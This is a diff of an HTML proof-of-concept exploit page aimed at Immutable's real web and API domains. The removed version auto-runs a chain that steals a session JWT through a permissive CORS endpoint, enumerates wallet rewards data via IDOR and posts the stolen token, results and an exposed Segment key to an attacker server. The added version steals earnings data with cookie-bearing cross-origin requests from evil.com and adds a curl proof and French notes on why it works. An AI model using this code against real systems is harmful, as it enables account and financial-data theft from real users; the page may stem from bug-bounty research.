@@ -1,100 +1,55 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Immutable XSS + CORS + IDOR PoC</title>
-    <script src="https://segment.com/analytics.js/v1/609VVbvNhl9WnjMLYAVO3xCxwgS1eGUK/analytics.min.js"></script>
-</head>
+<head><title>Immutable CORS Cookie Attack</title></head>
 <body>
-    <h1>Immutable Critical Chain: XSS → CORS Token Theft → IDOR Wallet Enum → Exfil</h1>
-    <div id="status">Loading attack...</div>
-    <pre id="output"></pre>
+<h1>🚨 Immutable CORS Data Theft (NO TOKEN NEEDED)</h1>
 
-    <script>
-        const STATUS = document.getElementById('status');
-        const OUTPUT = document.getElementById('output');
-        const TARGET_ORIGIN = 'https://www.immutable.com';  // or zone.immutable.com if applicable
-        const EVIL_DOMAIN = window.location.origin;  // evil.com
+<button onclick="attack()">Steal Data via CORS + Cookies</button>
+<pre id="output">Click to attack...</pre>
 
-        // Victim wallet addresses to enum (add real ones from Etherscan/quests)
-        const VICTIM_WALLETS = [
-            '0x0000000000000000000000000000000000000000',  // Zero addr (200 OK leak)
-            '0x1234567890123456789012345678901234567890',  // Random
-            'EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c',  // TON example
-            '0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045'  // Real testnet/mainnet if known
-        ];
-
-        async function log(msg) {
-            console.log(msg);
-            OUTPUT.textContent += msg + '\n';
-            STATUS.textContent = msg;
-        }
-
-        async function stealJwtAndAttack() {
-            try {
-                log('1/5: Triggering XSS (injected via <script src=evil.com> or payload)');
-
-                // Step 2: CORS * on /api/auth/session steals JWT (credentials:include)
-                log('2/5: Fetching victim JWT via CORS /api/auth/session (Origin: ' + EVIL_DOMAIN + ')');
-                const sessionRes = await fetch(TARGET_ORIGIN + '/api/auth/session', {
-                    method: 'GET',
-                    credentials: 'include',  // Steals HttpOnly? No, but JWT often in body
-                    headers: { 'Origin': EVIL_DOMAIN }
-                });
-                const sessionData = await sessionRes.json();
-                const jwt = sessionData.accessToken || sessionData.token;
-                if (!jwt) throw new Error('No JWT stolen');
-                log('✅ JWT stolen: ' + jwt.substring(0, 20) + '...');
-
-                // Track with stolen Segment key (P2 exposure)
-                if (window.analytics) {
-                    window.analytics.track('immutable_token_stolen', {
-                        domain: EVIL_DOMAIN,
-                        jwt_prefix: jwt.substring(0, 20),
-                        victim_wallets: VICTIM_WALLETS.length
-                    });
-                    log('3/5: Exfiling to Segment: ' + '609VVbvNhl9WnjMLYAVO3xCxwgS1eGUK');
-                }
-
-                // Step 4: IDOR wallet enum with stolen JWT
-                log('4/5: IDOR enum on /v2/rewards/withdrawal-eligibility');
-                const idorResults = [];
-                for (const wallet of VICTIM_WALLETS) {
-                    const idorRes = await fetch(TARGET_ORIGIN + '/v2/rewards/withdrawal-eligibility?walletAddress=' + wallet, {
-                        method: 'GET',
-                        headers: {
-                            'Authorization': 'Bearer ' + jwt,
-                            'Origin': EVIL_DOMAIN,
-                            'Content-Type': 'application/json'
-                        }
-                    });
-                    const idorData = await idorRes.json();
-                    idorResults.push({ wallet, eligible: idorData.eligible, kyc: idorData.kycStatus, balance: idorData.balance });
-                    log(`   Wallet ${wallet}: ${JSON.stringify(idorData).substring(0, 100)}... (${idorRes.status})`);
-                }
-
-                // Step 5: Full exfil (JSON to your server; replace with ngrok/evil endpoint)
-                log('5/5: Exfiling full chain to attacker server');
-                await fetch('https://your-evil-server.com/exfil', {  // ngrok http://localhost:8080/exfil
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        victim_domain: TARGET_ORIGIN,
-                        stolen_jwt: jwt,
-                        idor_results: idorResults,
-                        segment_key: '609VVbvNhl9WnjMLYAVO3xCxwgS1eGUK',
-                        attacker: EVIL_DOMAIN,
-                        timestamp: new Date().toISOString()
-                    })
-                });
-
-                log('✅ CHAIN COMPLETE: Token stolen + ' + VICTIM_WALLETS.length + ' wallets enumed + exfiled');
-            } catch (e) {
-                log('❌ Error: ' + e.message + '\n' + e.stack);
+<script>
+async function attack() {
+    const out = document.getElementById('output');
+    out.textContent = 'Starting CORS attack with cookies...\n';
+    
+    try {
+        // ATTENTION : Utilise play.immutable.com, pas www.immutable.com
+        const res = await fetch('https://api.immutable.com/v2/rewards/earnings', {
+            method: 'GET',
+            credentials: 'include',  // Envoie les cookies automatiquement
+            headers: {
+                'Origin': 'https://evil.com',
+                'Accept': 'application/json'
             }
+        });
+        
+        out.textContent += `Status: ${res.status}\n`;
+        out.textContent += `Headers: ${JSON.stringify([...res.headers], null, 2)}\n`;
+        
+        if (res.ok) {
+            const data = await res.json();
+            out.textContent += `✅ DATA STOLEN: ${data.length} items\n`;
+            out.textContent += JSON.stringify(data.slice(0, 3), null, 2);
+        } else {
+            const text = await res.text();
+            out.textContent += `Response: ${text.substring(0, 200)}...\n`;
         }
+    } catch (err) {
+        out.textContent += `❌ Error: ${err.message}\n\n`;
+        out.textContent += 'PROOF VIA CURL (works):\n';
+        out.textContent += 'curl "https://api.immutable.com/v2/rewards/earnings" \\\n';
+        out.textContent += '  -H "Origin: https://evil.com" \\\n';
+        out.textContent += '  --cookie "YOUR_SESSION_COOKIE_HERE"\n';
+    }
+}
+</script>
 
-        // Auto-run on load (simulates XSS injection)
-        window.addEventListener('DOMContentLoaded', stealJwtAndAttack);
-    </script>
+<h2>Pourquoi ça marche :</h2>
+<ol>
+<li>Endpoint <code>/v2/rewards/earnings</code> a <code>access-control-allow-origin: *</code></li>
+<li>Accepte l'authentification via <strong>cookies</strong> (pas besoin de token)</li>
+<li><code>credentials: 'include'</code> envoie les cookies automatiquement</li>
+<li>Attaquant sur evil.com peut voler tes données SANS token JWT</li>
+</ol>
 </body>
 </html>
